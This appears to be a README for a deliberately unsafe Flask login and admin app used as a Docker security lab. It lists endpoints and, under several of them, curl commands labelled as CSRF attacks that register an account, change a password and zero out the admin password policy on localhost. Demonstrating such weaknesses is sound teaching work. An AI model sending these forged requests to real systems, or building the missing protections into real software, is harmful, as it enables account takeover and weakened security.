# Safe Register & Login Administration

__Unsafe mode for Demonstration.__

Build with:

__BACKEND:__ _Python 3.9 & Flask_

__FRONTEND:__ _JS, HTML & CSS_

__INTEGRATIONS:__ _Jinja2_

Deployed over Docker, inorder to contain a safety lab environment

## Endpoints

**Home**

* Point for demonstrate a CSRF attacks

**User**

* Registration
* Login
* Change Password
* Logout

**Admin**

* Admin's Menu
    * View all Users List
    * Change Password Configuration

## Home

endpoint: `/`
<img src="\README\Photos\Home.PNG"/>

## User

### Register

User Register by given _Name_, _E-mail_, _Password_ and _re-Password_

__methods:__ `GET`, `POST`\
__endpoint:__ `/users/register`

<img src="C:\Users\psylo\PycharmProjects\flaskProject3\README\Photos\Register.PNG"/>\
__CSRF attack on endpoint:__\
````
$ curl -X POST -F 'username=Hacker' -F 'email=yougot@HACKED.com' 
-F 'password=AAaa1212@!12' -F 're_password=AAaa1212@!12' 
http://127.0.0.1:5000/users/register
````
\
__Result of attack:__\
<img src="C:\Users\psylo\PycharmProjects\flaskProject3\README\Photos\HackerRegistrationDB.PNG"/>

### Login

User Login by given _Name\Email_ and _Password_

__methods:__ `GET`, `POST`\
__endpoint:__ `/users/login`

<img src="C:\Users\psylo\PycharmProjects\flaskProject3\README\Photos\Login.PNG"/>\
__CSRF attack on endpoint:__\
````
$ curl -X POST -F 'name_email=Hacker' -F'password=AAaa1212@!12' 
http://127.0.0.1:5000/users/login
````
__Result of attack:__\
<img src="C:\Users\psylo\PycharmProjects\flaskProject3\README\Photos\HackerLogin.PNG"/>

### Change Password

User Change Password by given _Username_, _E-mail_, _New Password_ and _re-Password_

__methods:__ `GET`, `POST`\
__endpoint:__ `/users/change_password`

<img src="C:\Users\psylo\PycharmProjects\flaskProject3\README\Photos\ChangePassword.PNG"/>\
__CSRF attack on endpoint:__\
````
$ curl -X POST -F 'username=Hacker' -F 'email=yougot@HACKED.com' 
-F 'password=BBbb1212@!12' -F 're_password=BBbb1212@!12' 
http://127.0.0.1:5000/users/change_password
````
__Result of attack:__\
<img src="C:\Users\psylo\PycharmProjects\flaskProject3\README\Photos\HackerChangePassword.PNG"/>

### Logout

User Logout

__methods:__ `GET`\
__endpoint:__ `/users/logout`
<img src="C:\Users\psylo\PycharmProjects\flaskProject3\README\Photos\AfterUserLogin.PNG"/>

## Admin

### Admin's Menu

__methods:__ `GET`\
__endpoint:__ `/admin/menu`

<img src="C:\Users\psylo\PycharmProjects\flaskProject3\README\Photos\AdminMenu.PNG"/> 

### User's List

Display all registered users & __Block/Unblock__ users

__methods:__ `GET`\
__endpoint:__ `/admin/all_users`

<img src="C:\Users\psylo\PycharmProjects\flaskProject3\README\Photos\UsersList.PNG"/> 

### Password Configuration

Change password configuration:

* Length
* Complexity
* History
* Fail attempts

__methods:__ `GET`, `POST`\
__endpoint:__ `/admin/password_config`

<img src="C:\Users\psylo\PycharmProjects\flaskProject3\README\Photos\PasswordConfiguration.PNG"/> 

__CSRF attack on endpoint:__\
````
$ curl -X POST -F 'upper=0' -F 'lower=0' -F 'digits=0' 
-F 'spec=0' -F 'use_dict=0' -F 'length=0' -F 'history=10' 
-F 'tries=1000'  http://127.0.0.1:5000/admin/password_config
````
